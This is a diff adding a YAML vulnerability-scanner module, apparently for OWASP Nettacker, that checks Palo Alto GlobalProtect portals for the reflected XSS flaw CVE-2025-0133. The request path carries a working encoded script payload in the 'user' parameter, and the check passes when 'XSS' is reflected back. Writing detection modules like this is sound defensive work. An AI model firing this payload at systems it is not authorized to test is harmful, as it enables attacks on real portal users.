@@ -1,0 +1,64 @@
+info:
+  name: paloalto_globalprotect_cve_2025_0133_vuln
+  author: OWASP Nettacker team 
+  severity: 6.9
+  description: >
+    CVE-2025-0133 reflected cross-site scripting (XSS) vulnerability in the
+    GlobalProtect gateway and portal features of Palo Alto Networks PAN-OS
+    software enables execution of malicious JavaScript.
+  reference:
+    - https://security.paloaltonetworks.com/CVE-2025-0133
+    - https://cybersecuritynews.com/palo-alto-globalprotect-portal-vulnerability/
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-0133
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - medium_severity
+    - cve
+    - paloalto
+    - paloalto_globalprotect
+    - globalprotect
+    - panos
+    - cisa_kev
+  
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:  
+                - 'ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=<svg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22><script>prompt%28%22XSS%22%29<%2Fscript><%2Fsvg>&domain=%28empty_domain%29&computer=computer'
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 4443
+                - 8443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            header:
+              X-Content-Type-Options:
+                regex: 'nosniff'
+                reverse: false
+            content:
+              regex: 'XSS'
+              reverse: false
